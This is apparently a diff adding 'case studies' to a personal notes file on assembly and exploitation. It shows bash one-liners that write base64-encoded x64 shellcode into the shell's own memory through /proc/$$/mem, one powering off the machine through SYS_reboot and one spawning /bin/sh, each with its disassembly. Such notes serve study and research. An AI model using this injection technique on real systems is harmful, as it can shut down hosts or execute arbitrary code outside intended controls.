@@ -606,3 +606,47 @@ call eax
 - https://azeria-labs.com/writing-arm-assembly-part-1/
 - https://thinkingeek.com/arm-assembler-raspberry-pi/
 - https://opensecuritytraining.info/IntroARM.html
+
+# case studies
+
+### shutdown using bash process memory
+
+```bash
+# requires root || YAMA disabled
+dd of=/proc/$$/mem bs=1 seek=$(($(cut -d" " -f9</proc/$$/syscall))) if=<(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F) conv=notrunc
+
+python2 ~/opt/asm_buddy/asm_buddy.py -f d -a x64 -i "$(base64 -d<<<utz+IUO+aRkSKL+t3uH+McCwqQ8F | xxd -p)" -v
+# ; int syscall(SYS_reboot, int magic, int magic2, int cmd, void *arg);
+# 00000000 mov       edx, 0x4321fedc ; LINUX_REBOOT_CMD_POWER_OFF
+# 00000005 mov       esi, 0x28121969 ; LINUX_REBOOT_MAGIC2
+# 0000000a mov       edi, 0xfee1dead ; LINUX_REBOOT_MAGIC1
+# 0000000f xor       eax, eax
+# 00000011 mov       al, 0xa9 ; SYS_reboot
+# 00000013 syscall
+```
+
+### pop shell using bash process memory
+
+```bash
+cd /proc/$$;read a<syscall;exec 3>mem;base64 -d<<<McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F|dd bs=1 seek=$[`echo $a|cut -d" " -f9`]>&3
+# || golfed
+cd /*/$$;read a<*l;exec 3>mem;base64 -d<<<McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F|dd bs=1 seek=$[`cut -d\  -f9<<<$a`]>&3
+
+python2 ~/opt/asm_buddy/asm_buddy.py -f d -a x64 -i "$(base64 -d<<<McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F | xxd -p)" -v
+# ; int execve(const char *pathname, char *const argv[], char *const envp[]);
+# 00000000 xor       eax, eax
+# 00000002 movabs    rbx, 0xff978cd091969dd1
+# 0000000c neg       rbx ; /bin/sh
+# 0000000f push      rbx
+# 00000010 push      rsp
+# 00000011 pop       rdi
+# 00000012 cdq
+# 00000013 push      rdx
+# 00000014 push      rdi
+# 00000015 push      rsp
+# 00000016 pop       rsi
+# 00000017 mov       al, 0x3b
+# 00000019 syscall
+```
+
+- https://twitter.com/David3141593/status/1386438123647868930
